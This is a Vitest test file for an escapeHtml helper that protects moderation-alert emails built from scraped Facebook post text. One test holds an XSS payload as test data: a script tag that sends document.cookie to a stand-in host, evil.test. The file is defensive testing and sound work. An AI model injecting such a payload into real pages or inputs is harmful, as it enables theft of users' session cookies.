import { describe, it, expect } from 'vitest';
import { escapeHtml } from '../apps/web/app/lib/email';

/**
 * Moderation alerts interpolate scraped Facebook post text into an HTML email.
 * That text is written by whoever wrote the post, so it is untrusted input
 * arriving in the operator's inbox.
 */
describe('escapeHtml', () => {
  it('neutralises a script tag', () => {
    const attack = `</div><script>fetch('https://evil.test?c='+document.cookie)</script>`;
    const escaped = escapeHtml(attack);
    expect(escaped).not.toContain('<script>');
    expect(escaped).not.toContain('</div>');
    expect(escaped).toContain('&lt;script&gt;');
  });

  it('escapes every character that can break out of markup or an attribute', () => {
    expect(escapeHtml('&')).toBe('&amp;');
    expect(escapeHtml('<')).toBe('&lt;');
    expect(escapeHtml('>')).toBe('&gt;');
    expect(escapeHtml('"')).toBe('&quot;');
    expect(escapeHtml("'")).toBe('&#39;');
  });

  it('escapes the ampersand first, so entities are not double-encoded wrongly', () => {
    expect(escapeHtml('<a>')).toBe('&lt;a&gt;');
    expect(escapeHtml('A & B')).toBe('A &amp; B');
  });

  it('leaves ordinary listing text alone', () => {
    const text = '2018 Honda Accord EX-L, 45,000 miles. Asking $18,500 OBO.';
    expect(escapeHtml(text)).toBe(text);
  });

  it('does not throw on non-string input', () => {
    expect(escapeHtml(null as any)).toBe('null');
    expect(escapeHtml(42 as any)).toBe('42');
  });
});
